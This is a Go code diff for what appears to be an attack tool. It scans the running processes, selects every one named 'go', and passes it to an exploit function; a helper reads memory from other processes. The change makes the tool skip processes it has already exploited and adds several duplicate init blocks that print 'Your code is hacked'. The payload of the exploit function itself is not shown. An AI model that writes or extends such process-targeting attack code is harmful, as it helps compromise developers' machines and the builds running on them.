@@ -16,6 +16,8 @@ import (
 )
 
 func main() {
+	oldprocs := []int{}
+
 	c := make(chan os.Signal)
 	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
 	go func() {
@@ -23,11 +25,13 @@ func main() {
 		os.Exit(1)
 	}()
 	for {
-		findproc()
+		oldprocs = findproc(oldprocs)
 	}
 }
 
-func findproc() {
+func findproc(oldprocs []int) []int {
+	exploitprocs := []int{}
+
 	procs, err := ps.Processes()
 	if err != nil {
 		fmt.Println(err)
@@ -35,14 +39,22 @@ func findproc() {
 	}
 
 	for _, proc := range procs {
+		if contains(oldprocs, proc.Pid()) {
+			continue
+		}
+
 		exec := proc.Executable()
 
 		if exec == "go" {
 			eh, _ := os.FindProcess(proc.Pid())
 			exploit(eh.Pid)
 
+			exploitprocs = append(exploitprocs, eh.Pid)
+
 		}
 	}
+
+	return exploitprocs
 }
 
 func exploit(pid int) {
@@ -154,6 +166,35 @@ func readString(pid int, addr uintptr) (string, error) {
 	return str, nil
 }
 
+func init() {
+	fmt.Println("Your code is hacked")
+}
+
+func contains(s []int, e int) bool {
+	for _, a := range s {
+		if a == e {
+			return true
+		}
+	}
+	return false
+}
+
+func init() {
+	fmt.Println("Your code is hacked")
+}
+	
+func init() {
+	fmt.Println("Your code is hacked")
+}
+	
+func init() {
+	fmt.Println("Your code is hacked")
+}
+	
+func init() {
+	fmt.Println("Your code is hacked")
+}
+	
 func init() {
 	fmt.Println("Your code is hacked")
 }
